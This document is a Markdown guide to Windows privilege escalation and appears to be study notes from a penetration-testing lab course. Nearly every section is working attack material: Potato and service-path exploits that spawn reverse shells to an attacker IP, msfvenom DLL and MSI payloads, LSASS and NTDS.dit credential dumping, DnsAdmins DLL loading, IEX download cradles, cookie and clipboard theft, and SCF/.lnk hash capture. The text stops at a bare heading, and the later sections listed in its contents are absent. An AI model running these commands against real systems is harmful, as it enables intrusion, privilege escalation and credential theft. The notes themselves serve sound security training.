# Windows Privilege Escalation — Complete Module Documentation

> A comprehensive guide covering enumeration, exploitation, credential theft, and hardening for Windows privilege escalation.

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Useful Tools](#2-useful-tools)
3. [Situational Awareness](#3-situational-awareness)
4. [Initial Enumeration](#4-initial-enumeration)
5. [Communication with Processes](#5-communication-with-processes)
6. [Windows Privileges Overview](#6-windows-privileges-overview)
7. [SeImpersonate & SeAssignPrimaryToken](#7-seimpersonate--seassignprimarytoken)
8. [SeDebugPrivilege](#8-sedebugprivilege)
9. [SeTakeOwnershipPrivilege](#9-setakeownershipprivilege)
10. [Windows Built-in Groups](#10-windows-built-in-groups)
11. [SeBackupPrivilege](#11-sebackupprivilege)
12. [Event Log Readers](#12-event-log-readers)
13. [DnsAdmins](#13-dnsadmins)
14. [Hyper-V Administrators](#14-hyper-v-administrators)
15. [Print Operators](#15-print-operators)
16. [Server Operators](#16-server-operators)
17. [User Account Control (UAC)](#17-user-account-control-uac)
18. [Weak Permissions](#18-weak-permissions)
19. [Kernel Exploits](#19-kernel-exploits)
20. [Vulnerable Services](#20-vulnerable-services)
21. [DLL Injection](#21-dll-injection)
22. [Credential Hunting](#22-credential-hunting)
23. [Other Files](#23-other-files)
24. [Further Credential Theft](#24-further-credential-theft)
25. [Interacting with Users](#25-interacting-with-users)
26. [Pillaging](#26-pillaging)
27. [Miscellaneous Techniques](#27-miscellaneous-techniques)
28. [Legacy Operating Systems](#28-legacy-operating-systems)
29. [Windows Hardening](#29-windows-hardening)
30. [Quick Reference Cheat Sheet](#30-quick-reference-cheat-sheet)

---

## 1. Introduction

### What is Privilege Escalation?
After gaining an initial foothold on a Windows machine, privilege escalation means gaining higher access — usually **Local Administrator** or **NT AUTHORITY\SYSTEM**. This grants:
- More control over the system
- Persistence
- Access to credentials
- Lateral movement paths
- Active Directory access

### Why It Matters
You may need higher privileges to:
- Test gold image builds for flaws
- Access local resources (databases, files)
- Get SYSTEM on a domain-joined machine
- Steal credentials for lateral movement
- Maintain persistence

### Common Attack Surface
- Abusing Windows group privileges
- Abusing Windows user privileges
- Bypassing User Account Control
- Weak service/file permissions
- Unpatched kernel exploits
- Credential theft
- Traffic capture

---

## 2. Useful Tools

| Tool | Purpose |
|---|---|
| **Seatbelt** | C# tool for local privilege escalation checks |
| **winPEAS** | Script that searches for privesc paths |
| **PowerUp** | PowerShell script for common misconfigurations |
| **SharpUp** | C# version of PowerUp |
| **JAWS** | PowerShell 2.0 enumeration script |
| **SessionGopher** | Extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP credentials |
| **Watson** | Enumerates missing KBs and suggests exploits |
| **LaZagne** | Retrieves passwords from browsers, chat, databases, email, etc. |
| **WES-NG** | Windows Exploit Suggester using systeminfo output |
| **Sysinternals Suite** | AccessChk, PipeList, PsService, etc. |

### Where to Upload Tools
C:\Windows\Temp

`BUILTIN\Users` usually has write access there.

### Important Notes
- Tools can cause **information overload** (winPEAS returns huge output)
- Tools can produce **false positives/negatives**
- Don't rely on "autopwn" scripts
- **Learn manual enumeration** — tools may not always be available
- Many tools are detected by AV/EDR

---

## 3. Situational Awareness

### Network Information

**Commands to Run:**
```cmd
ipconfig /all
arp -a
route print
```

**What to Look For:**
- Multiple NICs → dual-homed host → potential lateral movement
- DNS suffix/domain → indicates Active Directory
- ARP cache → recently contacted hosts
- Routing table → reachable networks

### Enumerating Protections

Check Windows Defender:
```powershell
Get-MpComputerStatus
```
Look at: AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled

Check AppLocker:
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
AppLocker may block cmd.exe, powershell.exe, or other binaries — you may need bypasses.

---

## 4. Initial Enumeration

### Key Data Points
- OS name and version
- Patch level
- Running services
- Installed software
- Current privileges
- Group memberships

### System Information
```cmd
tasklist /svc
set
systeminfo
wmic qfe
Get-HotFix | ft -AutoSize
wmic product get name
Get-WmiObject -Class Win32_Product | select Name, Version
netstat -ano
```

### User & Group Information
```cmd
query user
echo %USERNAME%
whoami /priv
whoami /groups
net user
net localgroup
net localgroup administrators
net accounts
```

### Key Things to Look For
- Non-standard processes (e.g., FileZilla, Tomcat)
- Missing patches → kernel exploits
- Writable PATH directories → DLL injection
- Privileged group memberships → direct escalation
- Stored credentials → credential theft
- Running as SYSTEM/service → token impersonation

---

## 5. Communication with Processes

### Access Tokens
- Windows uses access tokens to describe security context of a process
- Token contains user identity, group memberships, privileges
- SeImpersonatePrivilege enables token impersonation → Potato attacks

### Enumerating Network Services
```cmd
netstat -ano
```
Focus on loopback-only services (127.0.0.1, ::1) — often insecure.

**Classic Examples:**

| Service | Port | Risk |
|---|---|---|
| FileZilla Admin | 14147 | Extract FTP passwords, create FTP share |
| Splunk Forwarder | 8089 | No auth → code execution as SYSTEM |
| Erlang Port | 25672 | Weak/default cookie → cluster join |

### Named Pipes

List named pipes:
```cmd
pipelist.exe /accepteula
```
```powershell
gci \\.\pipe\
```

Check pipe permissions:
```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

Find writable pipes:
```cmd
accesschk.exe -w \pipe\* -v
```

If a pipe is writable by low-priv users and the service runs as SYSTEM → escalate.

---

## 6. Windows Privileges Overview

### Key Concept
Privileges ≠ Access Rights
- Privileges = system-wide rights (manage services, debug, shut down)
- Access Rights = permissions on specific objects

Most privileges are Disabled by default — must be enabled to use.

### Powerful Groups

| Group | Why It Matters |
|---|---|
| Default Administrators | Domain Admins/Enterprise Admins |
| Server Operators | Modify services, access SMB shares, backup files |
| Backup Operators | Log on to DCs, dump SAM/NTDS. Treat as Domain Admin |
| Print Operators | Log on to DCs, load malicious drivers |
| Hyper-V Administrators | Virtual DCs → Domain Admin equivalent |
| Account Operators | Modify non-protected accounts/groups |
| Remote Desktop Users | RDP login → lateral movement |
| DnsAdmins | Load DLL on DC → SYSTEM |
| Event Log Readers | Read security logs → harvest credentials |
| Schema Admins | Modify AD schema → backdoor |
| DNS Admins | Load DLL on DC, create WPAD record |

### Key User Rights (Privileges)

| Constant | Description | Abuse Potential |
|---|---|---|
| SeImpersonatePrivilege | Impersonate client | Juicy/Rogue/PrintSpoofer → SYSTEM |
| SeDebugPrivilege | Debug programs | Dump LSASS, spawn SYSTEM process |
| SeBackupPrivilege | Backup files | Read any file, dump SAM/SYSTEM |
| SeRestorePrivilege | Restore files | Set arbitrary owner, bypass perms |
| SeTakeOwnershipPrivilege | Take ownership | Own any file/registry/service |
| SeLoadDriverPrivilege | Load drivers | Kernel code execution |
| SeSecurityPrivilege | Manage auditing | Clear security log |
| SeTcbPrivilege | Act as part of OS | Full impersonation |
| SeShutdownPrivilege | Shut down | DoS on DCs |
| SeNetworkLogonRight | Network access | SMB/NetBIOS/CIFS |
| SeRemoteInteractiveLogonRight | RDP login | Lateral movement |

### Checking Privileges
```cmd
whoami /priv
```
- Elevated admin → long list including SeDebug, SeBackup, SeRestore, SeImpersonate
- Standard user → only SeChangeNotifyPrivilege and SeIncreaseWorkingSetPrivilege
- Disabled = assigned but not enabled — can be enabled with scripts

### Enabling Privileges
Use scripts like:
- Enable-Privilege.ps1
- EnableAllTokenPrivs.ps1

---

## 7. SeImpersonate & SeAssignPrimaryToken

### What It Is
SeImpersonatePrivilege lets a process use another process's token. Often given to service accounts (SQL, IIS, Jenkins).

### Potato Attacks
- JuicyPotato — Windows Server 2016 / Win10 pre-1809
- PrintSpoofer — Windows 10 1809+ / Server 2019+
- RoguePotato — Alternative for modern Windows
- LonelyPotato — Variant

### Attack Flow

1. Connect to MSSQL:
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

2. Enable xp_cmdshell:
```sql
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

3. Run JuicyPotato:
```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <IP> 8443 -e cmd.exe" -t *
```

4. Catch SYSTEM shell:
```bash
sudo nc -lnvp 8443
```

### Tool Selection by OS

| Tool | Works On |
|---|---|
| JuicyPotato | Server 2016, Win10 pre-1809 |
| PrintSpoofer | Win10 1809+, Server 2019+ |
| RoguePotato | Same as PrintSpoofer |

### Key Takeaway
SeImpersonatePrivilege = almost guaranteed SYSTEM on most Windows hosts.

---

## 8. SeDebugPrivilege

### What It Is
Normally granted only to Administrators. Lets you:
- Open/attach to any process
- Read/write process memory
- Access kernel structures

### Attack Paths

1. Dump LSASS:
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
Then with Mimikatz:
```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

2. Manual LSASS Dump (no tools):
Task Manager → Details → lsass.exe → Create dump file

3. RCE as SYSTEM via parent process token:
```powershell
[MyProcess]::CreateProcessFromParent(<SYSTEM_PID>,"cmd.exe","")
```

### Detection
- Event ID 4688 (process creation)
- Event ID 16385 (DPAPI activity)

---

## 9. SeTakeOwnershipPrivilege

### What It Is
Grants ability to take ownership of any securable object:
- NTFS files/folders
- Registry keys
- Services
- Processes
- AD objects

### Attack Flow

1. Check privilege:
```cmd
whoami /priv
```

2. Enable privilege:
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

3. Take ownership:
```cmd
takeown /f "C:\Department Shares\Private\IT\cred.txt"
icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F
type "C:\Department Shares\Private\IT\cred.txt"
```

### Important Warnings
- Destructive action — changing ownership can break apps
- Get client consent
- Revert changes afterward

### Files of Interest
- web.config
- %WINDIR%\repair\sam, system, software, security
- %WINDIR%\system32\config\*.sav
- KeePass .kdbx files
- passwords.*, creds.*, scripts

---

## 10. Windows Built-in Groups

### Backup Operators
- SeBackupPrivilege + SeRestorePrivilege
- Copy any file bypassing ACLs
- Log on to DCs locally
- Dump SAM/NTDS

### Server Operators
- Log on to DCs locally
- SeBackup + SeRestore
- Control local services (full access)
- Change service binary path → SYSTEM

### Print Operators
- SeLoadDriverPrivilege
- Log on to DCs
- Load malicious drivers (Capcom.sys) → SYSTEM

### Hyper-V Administrators
- Full access to Hyper-V
- If virtualized DCs exist → Domain Admin
- Clone DC VM → mount VHDX → dump NTDS

### DnsAdmins
- DNS service runs as SYSTEM
- Load custom DLL via dnscmd → SYSTEM
- WPAD record hijacking

### Event Log Readers
- Read event logs
- Harvest credentials from process creation logs

### Account Operators
- Modify non-protected accounts/groups

### Remote Desktop Users
- RDP login
- Lateral movement

### Remote Management Users
- PSRemoting to DCs

### Group Policy Creator Owners
- Create GPOs (need extra perms to link)

### Schema Admins
- Modify AD schema

### DNS Admins
- Load DLL on DC
- Create WPAD record

---

## 11. SeBackupPrivilege

### What It Is
Allows copying files bypassing ACLs. Must use FILE_FLAG_BACKUP_SEMANTICS.

### Enabling & Using

1. Load modules:
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Enable:
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Copy protected file:
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

### Attacking a Domain Controller — NTDS.dit

1. Create shadow copy:
```powershell
diskshadow.exe
```
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

2. Copy NTDS.dit:
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

3. Backup SAM & SYSTEM:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

4. Extract hashes:
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Robocopy Alternative
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

---

## 12. Event Log Readers

### What It Is
Group that allows reading event logs without admin rights.

### Why It Matters
If process creation auditing is enabled, command lines are logged. Credentials passed on command line end up in logs.

### Checking Membership
```cmd
net localgroup "Event Log Readers"
```

### Querying Logs

wevtutil:
```cmd
wevtutil qe Security /rd:true /f:text | findstr "/user"
```

Get-WinEvent:
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### Key Event
Event ID 4688 — A new process has been created (contains command line)

### Important Note
Searching Security log with Get-WinEvent requires admin access or special registry permissions. Being in Event Log Readers alone is not enough.

### PowerShell Operational Log
- May contain sensitive info
- Accessible to unprivileged users

---

## 13. DnsAdmins

### What It Is
Members have access to DNS information. DNS service runs as SYSTEM.

### Attack Path

1. Generate malicious DLL:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

2. Serve it:
```bash
python3 -m http.server 7777
```

3. Download to target:
```powershell
wget "http://<IP>:7777/adduser.dll" -outfile "adduser.dll"
```

4. Load the DLL (must use full path):
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

5. Restart DNS:
```cmd
sc stop dns
sc start dns
```

6. Verify DA membership:
```cmd
net group "Domain Admins" /dom
```

### Cleanup
```cmd
reg delete \\<DC>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc start dns
```

### WPAD Attack (Alternative)
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
Then run Responder to capture NTLMv2 hashes.

---

## 14. Hyper-V Administrators

### What It Is
Full access to all Hyper-V features. If virtualized DCs exist → Domain Admin equivalent.

### Attack Path
1. Clone DC VM
2. Mount VHDX offline
3. Extract NTDS.dit
4. Dump hashes

### Hard Link Attack (CVE-2018-0952 / CVE-2019-0841)
When deleting a VM, vmms.exe restores original file permissions as SYSTEM. Can create hard link pointing to a protected SYSTEM file.

Target: Any SYSTEM service startable by unprivileged users (e.g., Mozilla Maintenance Service).

Steps:
1. Run NT hard link PoC
2. Take ownership: `takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
3. Replace with malicious binary
4. Start service: `sc.exe start MozillaMaintenance`

Mitigated by March 2020 Windows security updates.

---

## 15. Print Operators

### What It Is
Grants SeLoadDriverPrivilege, rights to manage printers, log on locally to DCs, shut down DCs.

### Attack Path — Capcom.sys Driver

1. Check privilege:
```cmd
whoami /priv
```
Need to bypass UAC to see SeLoadDriverPrivilege.

2. Add driver registry key:
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

3. Enable privilege:
```cmd
EnableSeLoadDriverPrivilege.exe
```
Or use EoPLoadDriver.exe.

4. Verify driver loaded:
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

5. Exploit:
```powershell
.\ExploitCapcom.exe
```

6. Cleanup:
```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

### Note
Since Windows 10 1803, SeLoadDriverPrivilege is no longer exploitable this way (HKCU references blocked).

---

## 16. Server Operators

### What It Is
Highly privileged group that can:
- Log on locally to servers including DCs
- Has SeBackupPrivilege and SeRestorePrivilege
- Control local services

### Attack Path — Service Binary Path

1. Find a SYSTEM service:
```cmd
sc qc AppReadiness
```

2. Check permissions:
```cmd
C:\Tools\PsService.exe security AppReadiness
```

3. Change binary path:
```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

4. Start service (payload runs as SYSTEM):
```cmd
sc start AppReadiness
```

5. Verify admin:
```cmd
net localgroup Administrators
```

### Post-Exploitation on DC
```bash
crackmapexec smb <DC_IP> -u server_adm -p 'Password'
secretsdump.py server_adm@<DC_IP> -just-dc-user administrator
```

### Cleanup
```cmd
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
```

---

## 17. User Account Control (UAC)

### What It Is
Feature that prompts for consent before elevated activities run. Not a security boundary — a speed bump.

### Key Concepts
- Admin Approval Mode — new admin accounts run with filtered token
- RID 500 Administrator always operates at high mandatory level
- New admin accounts get two tokens: filtered and elevated

### Checking UAC Status
```cmd
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
- EnableLUA = 0x1 → UAC enabled
- ConsentPromptBehaviorAdmin = 0x5 → highest level (Always notify)

### Checking Windows Build
```powershell
[environment]::OSVersion.Version
```

### UACME Project
Maintains list of UAC bypasses by Windows build number.

### Technique #54 — SystemPropertiesAdvanced.exe DLL Hijacking

**The Flaw:** 32-bit SystemPropertiesAdvanced.exe tries to load non-existent srrstr.dll. Windows searches PATH → WindowsApps folder is writable.

**Attack Flow:**

1. Generate malicious DLL:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=8443 -f dll > srrstr.dll
```

2. Download to target:
```powershell
curl http://<IP>:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

3. Test DLL manually:
```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

4. Kill leftover rundll32 processes:
```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

5. Trigger auto-elevating binary:
```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

Catch elevated shell on listener.

---

## 18. Weak Permissions

### 1. Permissive File System ACLs

Detect with SharpUp:
```powershell
.\SharpUp.exe audit
```

Verify with icacls:
```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
Look for BUILTIN\Users:(I)(F).

Exploit: Replace service binary with malicious one:
```cmd
copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

### 2. Weak Service Permissions

Detect with SharpUp:
```powershell
SharpUp.exe audit
```

Verify with AccessChk:
```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```
Look for SERVICE_ALL_ACCESS for Authenticated Users.

Exploit:
```cmd
sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"
sc stop WindscribeService
sc start WindscribeService
```

Cleanup:
```cmd
sc config WindScribeService binpath= "c:\Program Files (x86)\Windscribe\WindscribeService.exe"
sc start WindScribeService
```

### 3. Unquoted Service Path

Find:
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Exploit: Place malicious executable at earlier search path (e.g., C:\Program.exe).

Rarely exploitable because creating files in root/Program Files needs admin.

### 4. Permissive Registry ACLs

Detect:
```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

Exploit:
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

### 5. Modifiable Registry Autorun Binary

Enumerate:
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

Exploit: Modify binary or registry key to point to your payload.

---

## 19. Kernel Exploits

### Core Concept
Kernel exploits let local low-priv users escalate to SYSTEM by abusing unpatched OS vulnerabilities.

**Warning:** Can crash the system. Test carefully and get client approval.

### Enumerating Missing Patches
```cmd
systeminfo
wmic qfe list brief
Get-Hotfix
```
Cross-reference KBs on Microsoft Update Catalog.

### Notable Vulnerabilities

| CVE | Name | Impact |
|---|---|---|
| MS08-067 | Server Service RCE | SYSTEM |
| MS17-010 | EternalBlue | SYSTEM |
| CVE-2021-36934 | HiveNightmare | Hash dump |
| CVE-2021-1675/34527 | PrintNightmare | SYSTEM |
| CVE-2020-0668 | Kernel EoP | Write to protected dir |

### HiveNightmare (CVE-2021-36934)

Check vulnerability:
```cmd
icacls C:\Windows\System32\config\SAM
```
If BUILTIN\Users:(I)(RX) appears → vulnerable.

Exploit:
```powershell
.\HiveNightmare.exe
```

Extract hashes:
```bash
impacket-secretsdump -sam SAM-<date> -system SYSTEM-<date> -security SECURITY-<date> local
```

### PrintNightmare (CVE-2021-1675/34527)

Check Spooler:
```powershell
ls \\localhost\pipe\spoolss
```

Exploit:
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### CVE-2020-0668 — Windows Kernel EoP

Chain with Mozilla Maintenance Service:
1. Generate malicious maintenanceservice.exe
2. Run exploit to move file and gain control
3. Replace with clean copy
4. Start service → SYSTEM shell

---

## 20. Vulnerable Services

### Core Concept
Well-patched systems can still be compromised via vulnerable third-party apps.

### Druva inSync 6.6.3

Enumerate:
```cmd
wmic product get name
netstat -ano | findstr 6064
get-process -Id <PID>
get-service | ? {$_.DisplayName -like 'Druva*'}
```

Exploit (PowerShell PoC):
```powershell
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(...)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Reverse shell variant:
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<IP>:8080/shell.ps1')"
```

---

## 21. DLL Injection

### Techniques
- LoadLibrary — Use OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
- Manual Mapping — Map sections manually, avoid LoadLibrary detection
- Reflective DLL Injection — DLL loads itself via ReflectiveLoader
- DLL Hijacking — Exploit search order flaws

### DLL Search Order

With SafeDllSearchMode = 1 (default):
1. Directory app loaded from
2. System directory
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

With SafeDllSearchMode = 0:
Current directory moves up to position 2.

### DLL Hijacking Attack

**DLL Proxying:**
1. Rename original library.dll → library.o.dll
2. Create malicious library.dll that forwards calls

**Invalid (Missing) Library:**
1. Use procmon to find NAME NOT FOUND for .dll
2. Drop your DLL with matching name

---

## 22. Credential Hunting

### Application Configuration Files
```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Key targets:
- IIS web.config
- C:\inetpub\wwwroot\web.config

### Dictionary Files
```powershell
gc 'C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files
Location: C:\Windows\Panther\, C:\Windows\System32\Sysprep\

Passwords stored in plaintext or base64 in unattend.xml.

### PowerShell History
```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
```

Enumerate all users:
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### PowerShell Credentials (DPAPI)
```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```
Must be same user + machine to decrypt.

---

## 23. Other Files

### Manual File System Searches

Search contents:
```cmd
findstr /SIM /C:"password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

Search filenames:
```cmd
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

PowerShell:
```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky Notes

Location:
```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

Extract with SQLite:
```sql
SELECT Text FROM Note;
```

PowerShell:
```powershell
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\<user>\...\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

Strings:
```bash
strings plum.sqlite-wal
```

### Other Interesting Files
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\*.sav
%USERPROFILE%\ntuser.dat
```

---

## 24. Further Credential Theft

### Cmdkey Saved Credentials
```cmd
cmdkey /list
```

Use saved creds:
```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### Browser Credentials (Chrome)
```powershell
.\SharpChrome.exe logins /unprotect
```

### Password Managers — KeePass

Extract hash:
```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

Crack with Hashcat:
```bash
hashcat -m 13400 keepass_hash rockyou.txt
```

### Email
Use MailSniper to search for "pass", "creds", "credentials".

### LaZagne
```powershell
.\lazagne.exe all
```

### SessionGopher
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Windows AutoLogon
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
Look for DefaultUserName and DefaultPassword.

### PuTTY Proxy Credentials
```
HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<SessionName>
```

### Wi-Fi Passwords
```cmd
netsh wlan show profile
netsh wlan show profile <name> key=clear
```

---

## 25. Interacting with Users

### Traffic Capture
- Wireshark — GUI capture
- tcpdump — CLI capture
- net-creds — extract passwords from pcap

### Process Command Lines
```powershell
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

### SCF on a File Share

Create @Inventory.scf:
```ini
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Start Responder:
```bash
sudo responder -w -v -I tun0
```

Crack NTLMv2:
```bash
hashcat -m 5600 hash rockyou.txt
```

### Malicious .lnk File (Server 2019+)
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "..."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

---

## 26. Pillaging

### Installed Applications
```cmd
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

PowerShell:
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort DisplayName -Unique | Format-Table -AutoSize
```

### mRemoteNG

Config location:
```
%USERPROFILE%\AppData\Roaming\mRemoteNG\confCons.xml
```

Decrypt:
```bash
python3 mremoteng_decrypt.py -s "<Password attribute>"
```

### Slack Cookie Extraction

Firefox:
```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
```bash
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
```

Chromium:
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
Invoke-SharpChromium -Command "cookies slack.com"
```

### Clipboard
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

### Backup Servers — Restic
```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
restic.exe -r E:\restic2\ snapshots
restic.exe -r E:\restic2\ restore <ID> --target C:\Restore
```

---

## 27. Miscellaneous Techniques

### LOLBAS
Microsoft-signed binaries with hidden functionality.

Certutil:
```cmd
certutil.exe -urlcache -split -f http://<IP>:8080/shell.bat shell.bat
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```

Rundll32:
```cmd
rundll32.exe <path_to_dll>,<export_function>
```

### AlwaysInstallElevated

Check:
```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Both must show AlwaysInstallElevated = 0x1.

Exploit:
```bash
msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=9443 -f msi > aie.msi
```
```cmd
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

### CVE-2019-1388 — Certificate Dialog
